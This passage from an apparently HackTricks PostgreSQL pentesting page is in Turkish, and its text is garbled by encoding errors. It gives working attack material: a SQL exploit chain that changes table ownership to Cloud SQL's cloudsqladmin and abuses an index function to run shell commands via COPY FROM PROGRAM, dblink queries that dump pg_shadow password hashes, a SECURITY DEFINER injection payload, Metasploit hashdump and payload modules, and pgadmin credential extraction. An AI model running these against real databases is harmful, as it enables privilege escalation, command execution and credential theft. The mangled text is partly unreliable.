[**Bu yazÄ±da**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) kullanÄ±cÄ±ya verilen ALTER TABLE yetkisini kÃ¶tÃ¼ye kullanarak Postgres GCP'de **privesc** yapmanÄ±n nasÄ±l mÃ¼mkÃ¼n olduÄŸu aÃ§Ä±klanmaktadÄ±r.

Bir tabloyu baÅŸka bir kullanÄ±cÄ±nÄ±n sahibi yapmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±zda, bunu engelleyen bir **hata** almanÄ±z gerekiyor, ancak gÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re GCP, bu **seÃ§eneÄŸi sÃ¼per kullanÄ±cÄ± olmayan postgres kullanÄ±cÄ±sÄ±na** vermiÅŸ:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Bu fikri, **INSERT/UPDATE/ANALYZE** komutlarÄ±nÄ±n bir **indeks iÅŸlevine sahip bir tabloda** Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, **iÅŸlevin** komutun bir parÃ§asÄ± olarak **Ã§aÄŸrÄ±ldÄ±ÄŸÄ± ve tablonun sahibinin izinlerini** kullandÄ±ÄŸÄ± gerÃ§eÄŸiyle birleÅŸtirerek dÃ¼ÅŸÃ¼nebiliriz. Bir iÅŸlevle bir indeks oluÅŸturmak ve bu tabloya sahip bir **sÃ¼per kullanÄ±cÄ±ya sahip izinler** vermek, ardÄ±ndan sahibin izinlerini kullanan kÃ¶tÃ¼ niyetli bir iÅŸlevle tabloyu ANALYZE etmek mÃ¼mkÃ¼ndÃ¼r. Bu sayede komutlarÄ± yÃ¼rÃ¼tebilecek Ã§Ã¼nkÃ¼ sahibin izinlerini kullanmaktadÄ±r.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### SÃ¶mÃ¼rÃ¼

1. Yeni bir tablo oluÅŸturarak baÅŸlayÄ±n.
2. Tabloya ilgisiz iÃ§erikler ekleyerek, dizin iÅŸlevi iÃ§in veri saÄŸlayÄ±n.
3. Yetkisiz komutlarÄ±n yÃ¼rÃ¼tÃ¼lmesine izin veren bir kod yÃ¼rÃ¼tme yÃ¼kÃ¼ iÃ§eren kÃ¶tÃ¼ amaÃ§lÄ± bir dizin iÅŸlevi geliÅŸtirin.
4. Tablonun sahibini "cloudsqladmin" olarak DEÄÄ°ÅTÄ°RÄ°N. Bu, Cloud SQL tarafÄ±ndan veritabanÄ±nÄ± yÃ¶netmek ve sÃ¼rdÃ¼rmek iÃ§in Ã¶zel olarak kullanÄ±lan GCP'nin sÃ¼per kullanÄ±cÄ± rolÃ¼dÃ¼r.
5. Tabloya bir ANALYZE iÅŸlemi gerÃ§ekleÅŸtirin. Bu iÅŸlem, PostgreSQL motorunun tablonun sahibi olan "cloudsqladmin" kullanÄ±cÄ± baÄŸlamÄ±na geÃ§mesini saÄŸlar. SonuÃ§ olarak, kÃ¶tÃ¼ amaÃ§lÄ± dizin iÅŸlevi "cloudsqladmin" izinleriyle Ã§aÄŸrÄ±lÄ±r ve Ã¶nceden yetkilendirilmemiÅŸ kabuk komutunun yÃ¼rÃ¼tÃ¼lmesine olanak tanÄ±r.

PostgreSQL'de bu akÄ±ÅŸ ÅŸuna benzer:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
ArdÄ±ndan, `shell_commands_results` tablosu, yÃ¼rÃ¼tÃ¼len kodun Ã§Ä±ktÄ±sÄ±nÄ± iÃ§erecektir:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Yerel GiriÅŸ

BazÄ± yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ postgresql Ã¶rnekleri, herhangi bir yerel kullanÄ±cÄ±nÄ±n giriÅŸine izin verebilir. **`dblink` fonksiyonunu** kullanarak 127.0.0.1'den yerel olarak giriÅŸ yapmak mÃ¼mkÃ¼ndÃ¼r:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Ã–nceki sorgunun Ã§alÄ±ÅŸmasÄ± iÃ§in **`dblink` fonksiyonunun var olmasÄ± gerektiÄŸini** unutmayÄ±n. EÄŸer yoksa, aÅŸaÄŸÄ±daki komutu kullanarak oluÅŸturmayÄ± deneyebilirsiniz:
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

EÄŸer daha fazla ayrÄ±calÄ±ÄŸa sahip bir kullanÄ±cÄ±nÄ±n ÅŸifresine sahipseniz, ancak kullanÄ±cÄ±nÄ±n harici bir IP'den giriÅŸ yapmasÄ±na izin verilmiyorsa, aÅŸaÄŸÄ±daki iÅŸlevi kullanarak o kullanÄ±cÄ± olarak sorgularÄ± Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Bu iÅŸlevin var olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek mÃ¼mkÃ¼ndÃ¼r:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **SECURITY DEFINER ile tanÄ±mlanan Ã¶zel iÅŸlev**

[**Bu yazÄ±da**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), IBM tarafÄ±ndan saÄŸlanan bir postgres Ã¶rneÄŸinde pentester'lar, **SECURITY DEFINER bayraÄŸÄ±na sahip bu iÅŸlevi bulduklarÄ± iÃ§in** bir postgres Ã¶rneÄŸi iÃ§inde privesc yapmayÄ± baÅŸardÄ±lar:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
â€¦
</code></pre>

[**Belgelerde aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://www.postgresql.org/docs/current/sql-createfunction.html), **SECURITY DEFINER ile tanÄ±mlanan bir iÅŸlev**, ona sahip olan kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ±yla Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. Bu nedenle, iÅŸlev **SQL Injection'a karÅŸÄ± savunmasÄ±zsa** veya saldÄ±rgan tarafÄ±ndan kontrol edilen bazÄ± parametrelerle **ayrÄ±calÄ±klÄ± eylemler gerÃ§ekleÅŸtiriyorsa**, postgres iÃ§inde **ayrÄ±calÄ±klarÄ± yÃ¼kseltmek** iÃ§in kÃ¶tÃ¼ye kullanÄ±labilir.

Ã–nceki kodun 4. satÄ±rÄ±nda iÅŸlevin **SECURITY DEFINER** bayraÄŸÄ±na sahip olduÄŸunu gÃ¶rebilirsiniz.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Ve ardÄ±ndan **komutlarÄ± Ã§alÄ±ÅŸtÄ±rÄ±n**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQL ile Burteforce GeÃ§in

**PL/pgSQL**, SQL'ye kÄ±yasla daha fazla prosedÃ¼rel kontrol sunan **tam Ã¶zellikli bir programlama dili**dir. Program mantÄ±ÄŸÄ±nÄ± geliÅŸtirmek iÃ§in **dÃ¶ngÃ¼ler** ve diÄŸer **kontrol yapÄ±larÄ±** kullanmayÄ± mÃ¼mkÃ¼n kÄ±lar. AyrÄ±ca, **SQL ifadeleri** ve **tetikleyiciler**, **PL/pgSQL dilini** kullanarak oluÅŸturulan fonksiyonlarÄ± Ã§aÄŸÄ±rma yeteneÄŸine sahiptir. Bu entegrasyon, veritabanÄ± programlamasÄ± ve otomasyonu iÃ§in daha kapsamlÄ± ve esnek bir yaklaÅŸÄ±m saÄŸlar.\
**PostgreSQL'e kullanÄ±cÄ± kimlik bilgilerini brute-force yapmasÄ± iÃ§in bu dili istismar edebilirsiniz.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### gÃ¼nlÃ¼kleme

_**postgresql.conf**_ dosyasÄ±nÄ±n iÃ§inde, postgresql gÃ¼nlÃ¼klerini etkinleÅŸtirebilirsiniz. Bunun iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyin:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
ArdÄ±ndan, **hizmeti yeniden baÅŸlatÄ±n**.

### pgadmin

[pgadmin](https://www.pgadmin.org), PostgreSQL iÃ§in bir yÃ¶netim ve geliÅŸtirme platformudur.\
ParolalarÄ± _**pgadmin4.db**_ dosyasÄ±nÄ±n iÃ§inde bulabilirsiniz.\
OnlarÄ± ÅŸu betik iÃ§indeki _**decrypt**_ iÅŸlevini kullanarak ÅŸifreleyebilirsiniz: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

PostgreSQL'de istemci kimlik doÄŸrulamasÄ± **pg_hba.conf** adlÄ± bir yapÄ±landÄ±rma dosyasÄ± aracÄ±lÄ±ÄŸÄ±yla yÃ¶netilir. Bu dosya, baÄŸlantÄ± tÃ¼rÃ¼nÃ¼, istemci IP adresi aralÄ±ÄŸÄ±nÄ± (uygulanabilirse), veritabanÄ± adÄ±nÄ±, kullanÄ±cÄ± adÄ±nÄ± ve eÅŸleÅŸen baÄŸlantÄ±lar iÃ§in kullanÄ±lacak kimlik doÄŸrulama yÃ¶ntemini belirten bir dizi kayÄ±t iÃ§erir. BaÄŸlantÄ± tÃ¼rÃ¼, istemci adresi, istenen veritabanÄ± ve kullanÄ±cÄ± adÄ±yla eÅŸleÅŸen ilk kayÄ±t kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±lÄ±r. Kimlik doÄŸrulamasÄ± baÅŸarÄ±sÄ±z olursa geriye dÃ¶nÃ¼ÅŸ veya yedekleme yoktur. EÅŸleÅŸen hiÃ§bir kayÄ±t yoksa eriÅŸim reddedilir.

pg_hba.conf'deki mevcut ÅŸifre tabanlÄ± kimlik doÄŸrulama yÃ¶ntemleri **md5**, **crypt** ve **password**'dÄ±r. Bu yÃ¶ntemler, ÅŸifrenin nasÄ±l iletildiÄŸinde farklÄ±lÄ±k gÃ¶sterir: MD5 karma, crypt ÅŸifreli veya aÃ§Ä±k metin. Crypt yÃ¶ntemi, pg_authid'de ÅŸifrelenmiÅŸ olan ÅŸifrelerle kullanÄ±lamaz.

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
DÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin** iÃ§in [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
